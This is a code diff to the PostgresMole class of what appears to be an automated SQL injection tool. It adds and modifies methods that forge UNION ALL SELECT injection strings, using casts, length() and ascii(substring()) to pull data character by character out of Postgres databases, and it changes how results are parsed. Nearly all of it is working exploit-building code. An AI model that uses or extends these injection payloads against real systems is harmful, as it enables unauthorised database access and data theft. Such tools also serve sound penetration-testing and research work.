@@ -148,11 +148,32 @@ class PostgresMole(DbmsMole):
     def forge_integer_count_query(self, column_count, fields, table_name, injectable_field, where = None):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.query)
-        query_list[injectable_field] = ("(" + PostgresMole.integer_out_delimiter + "||COUNT(" + fields + ")||" + PostgresMole.integer_out_delimiter + ")")
+        query_list[injectable_field] = ("cast(cast(" + PostgresMole.integer_out_delimiter + " as varchar(10))||COUNT(" + fields + ")||cast(" + PostgresMole.integer_out_delimiter + " as varchar(10)) as bigint)")
         query += ','.join(query_list)
         at_end = ''
         if len(table_name) > 0:
             query += " from " + table_name 
+        if not where is None:
+            query += " where " + self.parse_condition(where)
+        query += at_end
+        return query
+
+    def forge_integer_len_query(self, column_count, fields, table_name, injectable_field, where = None, offset = 0):
+        query = " and 1 = 0 UNION ALL SELECT "
+        query_list = list(self.query)
+        # It's not beatiful but it works :D
+        if fields == 'distinct(schemaname)':
+            query += " distinct on(schemaname) "
+            fields = 'schemaname'
+        query_list[injectable_field] = ("cast(cast(" + PostgresMole.integer_out_delimiter + " as varchar(10))||length(" +
+                                            ('||cast(' + PostgresMole.inner_delimiter + ' as varchar(10))||').join(fields.split(',')) +
+                                            ")||cast(" + PostgresMole.integer_out_delimiter + " as varchar(10)) as bigint)"
+                                        )
+        query += ','.join(query_list)
+        at_end = ''
+        if len(table_name) > 0:
+            query += " from " + table_name 
+            at_end = " limit 1 offset " + str(offset)
         if not where is None:
             query += " where " + self.parse_condition(where)
         query += at_end
@@ -165,9 +186,9 @@ class PostgresMole(DbmsMole):
         if fields == 'distinct(schemaname)':
             query += " distinct on(schemaname) "
             fields = 'schemaname'
-        query_list[injectable_field] = ("(" + PostgresMole.integer_out_delimiter + "||(" +
-                                            ('||' + PostgresMole.inner_delimiter + '||').join(fields.split(',')) +
-                                            ")||" + PostgresMole.integer_out_delimiter + ")"
+        query_list[injectable_field] = ("cast(cast(" + PostgresMole.integer_out_delimiter + " as varchar(10))||ascii(substring(" +
+                                            ('||cast(' + PostgresMole.inner_delimiter + ' as varchar(10))||').join(fields.split(',')) +
+                                            ", " + str(index)+",1))||cast(" + PostgresMole.integer_out_delimiter + " as varchar(10)) as bigint)"
                                         )
         query += ','.join(query_list)
         at_end = ''
@@ -210,8 +231,6 @@ class PostgresMole(DbmsMole):
         for i in range(base, base + query_columns):
             hashes.append(str(i))
         output.append(FingerBase(list(hashes), to_search))
-        print(repr(output))
-        print(output[0]._query)
         return output + output_int
     
     @classmethod
@@ -233,7 +252,10 @@ class PostgresMole(DbmsMole):
         return ('||' + PostgresMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(' + x + ',CHR(32))', fields))
 
     def parse_results(self, url_data):
-        data_list = url_data.split(PostgresMole.out_delimiter_result)
+        if not self.finger or self.finger.is_string_query:
+            data_list = url_data.split(PostgresMole.out_delimiter_result)
+        else:
+            data_list = url_data.split(PostgresMole.integer_out_delimiter)
         if len(data_list) < 3:
             return None
         data = data_list[1]
